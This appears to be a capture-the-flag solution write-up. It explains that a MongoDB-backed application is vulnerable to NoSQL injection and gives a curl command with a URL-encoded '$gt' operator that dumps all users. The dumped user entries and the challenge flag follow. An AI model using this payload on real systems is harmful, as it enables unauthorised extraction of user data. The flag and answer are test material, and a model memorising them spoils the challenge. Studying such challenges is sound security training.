Solution
========

To solve the problem you need to find out that it is vulnerable to NoSQL injection, since the application is using a MongoDB. To solve the problem you need to retrieve all data from the users in the database.

The NoSQL injection payload is 
```
curl 'http://<challenge_url>/user/%7B%22$gt%22:%20%22%22%7D' -H 'Host: <challenge host>'

```

The list:

```
sgaivota_7148e4934addcddf2cbfe5460f80dee8b87762bfbb45f38c79a2385f398b6052,8e6b3890f99e5153fc786f4a32d3b3c00bc5d5c1432ff9ffcb22d3ecc5e1f687
bruce_0f0c13b699793c02382b2767f9de3234a0fd4a9cd6853757d6a2a86a2b46e4a3,56c7fd904eb97e9834ca476a5636335ab1a9ae6b48ffc433e3a1682679c37d58
chuck_3079ed4ab72f4c4eb3702eab8ac463af21e54ce49cce5bbf9909f3a71a58e6c0,75d8c434c2537748f01aa4e86e7c379ac71e261bbb890666750fdb7a8184f4c0
```


Flag
----

`1195254`

